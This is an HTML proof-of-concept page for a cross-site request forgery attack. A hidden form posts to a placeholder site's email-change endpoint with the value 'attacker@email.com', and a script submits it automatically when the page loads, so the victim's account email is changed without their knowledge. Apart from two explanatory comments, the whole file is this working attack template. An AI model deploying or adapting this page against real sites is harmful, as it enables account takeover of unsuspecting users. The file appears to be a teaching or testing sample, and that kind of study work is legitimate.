<html><body>
  
    <form action="https://abc.com/email/change" method="POST">	
	<!-- attacker change the value of the email to their own email address-->
      <input type="hidden" name="email" value="attacker@email.com" />
    </form>
	
    <script>
	//This form will require the user to click on the submit button, but this can be also executed automatically using JavaScript:
      document.forms[0].submit(); 
    </script>
	
</body></html>